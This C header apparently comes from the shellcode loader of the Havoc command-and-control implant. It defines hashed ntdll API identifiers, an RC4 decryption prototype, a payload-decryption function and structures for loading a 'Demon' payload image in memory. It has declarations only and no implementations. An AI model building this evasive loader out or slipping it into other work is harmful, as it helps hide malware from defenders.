/**
 * Core.h - Replicated from Havoc Shellcode
 */

#ifndef _CORE_H_
#define _CORE_H_

#include <windows.h>
#include <Macro.h>


#define NT_SUCCESS(Status)              (((NTSTATUS)(Status)) >= 0)
#define PAGE_SIZE                       4096
#define MemCopy                         __builtin_memcpy
#define NTDLL_HASH                      0x70e61753

#define SYS_LDRLOADDLL                  0x9e456a43
#define SYS_NTALLOCATEVIRTUALMEMORY     0xf783b8ec
#define SYS_NTPROTECTEDVIRTUALMEMORY    0x50e92888
#define SYS_NTFREEVIRTUALMEMORY         0x2802c609

typedef struct {
    WORD offset :12;
    WORD type   :4;
} *PIMAGE_RELOC;

typedef struct
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} U_STRING, *PU_STRING;

typedef struct
{
    struct
    {
        UINT_PTR Ntdll;
    } Modules;

    struct {
        NTSTATUS ( NTAPI *LdrLoadDll )(
                PWSTR           DllPath,
                PULONG          DllCharacteristics,
                PU_STRING       DllName,
                PVOID           *DllHandle
        );

        NTSTATUS ( NTAPI *NtAllocateVirtualMemory ) (
                HANDLE      ProcessHandle,
                PVOID       *BaseAddress,
                ULONG_PTR   ZeroBits,
                PSIZE_T     RegionSize,
                ULONG       AllocationType,
                ULONG       Protect
        );

        NTSTATUS ( NTAPI *NtProtectVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   NewProtect,
                PULONG  OldProtect
        );

        NTSTATUS ( NTAPI *NtFreeVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   FreeType
        );
    } Win32;

} INSTANCE, *PINSTANCE;

UINT_PTR GetRIP( VOID );
VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize );
VOID Rc4( PBYTE Data, DWORD DataLen, PBYTE Key, DWORD KeyLen );
LPVOID DecryptDllBase( PINSTANCE pInstance, LPVOID pDllBase );

#pragma pack(1)
typedef struct
{
    PVOID KaynLdr;
    PVOID DllCopy;
    PVOID Demon;
    DWORD DemonSize;
    PVOID TxtBase;
    DWORD TxtSize;
} KAYN_ARGS, *PKAYN_ARGS;

VOID KaynLdrImport( PINSTANCE pInstance, LPVOID KVirtualMemory, PIMAGE_NT_HEADERS NtHeaders, DWORD KHdrSize );

#endif // _CORE_H_
